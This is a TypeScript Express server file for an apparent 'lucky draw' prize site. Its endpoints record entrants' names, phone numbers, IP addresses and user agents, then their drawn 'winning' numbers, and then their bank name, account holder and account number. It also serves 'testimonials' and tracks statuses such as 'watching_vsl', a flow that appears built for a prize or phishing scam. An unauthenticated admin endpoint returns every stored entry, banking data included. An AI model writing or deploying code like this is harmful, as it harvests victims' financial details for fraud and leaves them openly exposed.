import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { db } from './src/server/db.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = Number(process.env.PORT) || 3000;
  const isProd = process.env.NODE_ENV === 'production';

  app.use(express.json());

  // Health and fast ping
  app.get('/api/health', (_req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), time: Date.now() });
  });

  // Fast database stats
  app.get('/api/stats', (_req, res) => {
    res.json(db.getStats());
  });

  // Testimonials and comments
  app.get('/api/comments', (_req, res) => {
    res.json(db.getComments());
  });

  // Live like interaction
  app.post('/api/comments/:id/like', (req, res) => {
    const result = db.likeComment(req.params.id);
    res.json(result);
  });

  // Step 1: Record participant lead
  app.post('/api/entries', (req, res) => {
    try {
      const { name, phone, desiredPrize } = req.body;
      if (!name || !phone || !desiredPrize) {
        return res.status(400).json({ error: 'Missing required entry fields' });
      }
      const ip = (req.headers['x-forwarded-for']?.toString() || req.socket.remoteAddress || '').split(',')[0].trim();
      const userAgent = req.headers['user-agent'] || '';
      const entry = db.saveEntry({ name, phone, desiredPrize, ip, userAgent });
      return res.json({ success: true, entry });
    } catch (err: any) {
      console.error('[API] /entries error:', err);
      return res.status(500).json({ error: err.message || 'Server error' });
    }
  });

  // Step 2: Record lucky draw numbers
  app.post('/api/entries/:id/draw', (req, res) => {
    try {
      const { luckyNumber, drawnNumbers, wonPrize } = req.body;
      const updated = db.updateEntryDraw(req.params.id, Number(luckyNumber), drawnNumbers, wonPrize);
      if (!updated) return res.status(404).json({ error: 'Entry not found' });
      return res.json({ success: true, entry: updated });
    } catch (err: any) {
      console.error('[API] /draw error:', err);
      return res.status(500).json({ error: err.message || 'Server error' });
    }
  });

  // Step 3: Record bank account details
  app.post('/api/entries/:id/bank', (req, res) => {
    try {
      const { bank, accountHolder, accountNumber } = req.body;
      if (!bank || !accountHolder || !accountNumber) {
        return res.status(400).json({ error: 'Missing required banking fields' });
      }
      const updated = db.updateEntryBank(req.params.id, bank, accountHolder, accountNumber);
      if (!updated) return res.status(404).json({ error: 'Entry not found' });
      return res.json({ success: true, entry: updated });
    } catch (err: any) {
      console.error('[API] /bank error:', err);
      return res.status(500).json({ error: err.message || 'Server error' });
    }
  });

  // Status updates (e.g. approved, watching_vsl)
  app.post('/api/entries/:id/status', (req, res) => {
    try {
      const { status } = req.body;
      const updated = db.updateEntryStatus(req.params.id, status);
      if (!updated) return res.status(404).json({ error: 'Entry not found' });
      return res.json({ success: true, entry: updated });
    } catch (err: any) {
      console.error('[API] /status error:', err);
      return res.status(500).json({ error: err.message || 'Server error' });
    }
  });

  // Database inquiry for admin / owner
  app.get('/api/admin/entries', (_req, res) => {
    res.json({
      total: db.getRecentEntries().length,
      entries: db.getRecentEntries(),
    });
  });

  if (!isProd) {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.resolve(__dirname, 'dist')));
    app.get('*', (_req, res) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on port ${PORT}`);
  });
}

startServer().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
